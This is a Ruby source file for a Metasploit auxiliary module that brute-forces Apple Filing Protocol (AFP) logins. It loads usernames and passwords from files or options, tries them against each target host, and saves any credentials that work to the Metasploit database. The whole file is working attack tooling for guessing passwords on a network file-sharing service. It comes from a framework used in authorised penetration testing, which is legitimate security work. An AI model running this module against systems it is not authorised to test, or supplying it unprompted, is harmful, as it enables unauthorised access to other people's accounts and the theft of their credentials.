##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'openssl'
require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/afp'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::AuthBrute
  include Msf::Exploit::Remote::AFP

  def initialize(info={})
    super(update_info(info,
      'Name'         => 'Apple Filing Protocol Login Utility',
      'Description'  => %q{
        This module attempts to bruteforce authentication credentials for AFP.
      },
      'References'     =>
        [
          [ 'URL', 'https://developer.apple.com/library/mac/#documentation/Networking/Reference/AFP_Reference/Reference/reference.html' ],
          [ 'URL', 'https://developer.apple.com/library/mac/#documentation/networking/conceptual/afp/AFPSecurity/AFPSecurity.html' ]

        ],
      'Author'       => [ 'Gregory Man <man.gregory[at]gmail.com>' ],
      'License'      => MSF_LICENSE
    ))

    deregister_options('RHOST')
    register_options(
      [
        OptInt.new('LoginTimeOut', [ true, "Timout on login", 23 ]),
        OptBool.new('RECORD_GUEST', [ false, "Record guest login to the database", false]),
        OptBool.new('CHECK_GUEST', [ false, "Check for guest login", true])
      ], self)

  end

  def run_host(ip)
    print_status("Scanning IP: #{ip.to_s}")

    cred_collection = Metasploit::Framework::CredentialCollection.new(
        blank_passwords: datastore['BLANK_PASSWORDS'],
        pass_file: datastore['PASS_FILE'],
        password: datastore['PASSWORD'],
        user_file: datastore['USER_FILE'],
        userpass_file: datastore['USERPASS_FILE'],
        username: datastore['USERNAME'],
        user_as_pass: datastore['USER_AS_PASS'],
    )

    scanner = Metasploit::Framework::LoginScanner::AFP.new(
        host: ip,
        port: rport,
        proxies: datastore['PROXIES'],
        cred_details: cred_collection,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        connection_timeout: 30
    )

    service_data = {
        address: ip,
        port: rport,
        service_name: 'afp',
        protocol: 'tcp',
        workspace_id: myworkspace_id
    }

    scanner.scan! do |result|
      if result.success?
        credential_data = {
            module_fullname: self.fullname,
            origin_type: :service,
            private_data: result.credential.private,
            private_type: :password,
            username: result.credential.public
        }
        credential_data.merge!(service_data)

        credential_core = create_credential(credential_data)

        login_data = {
            core: credential_core,
            last_attempted_at: DateTime.now,
            status: Metasploit::Model::Login::Status::SUCCESSFUL
        }
        login_data.merge!(service_data)

        create_credential_login(login_data)
        print_good "#{ip}:#{rport} - LOGIN SUCCESSFUL: #{result.credential}"
      else
        invalidate_login(
            address: ip,
            port: rport,
            protocol: 'tcp',
            public: result.credential.public,
            private: result.credential.private,
            realm_key: nil,
            realm_value: nil,
            status: result.status)
        print_status "#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})"
      end
    end
  end


end
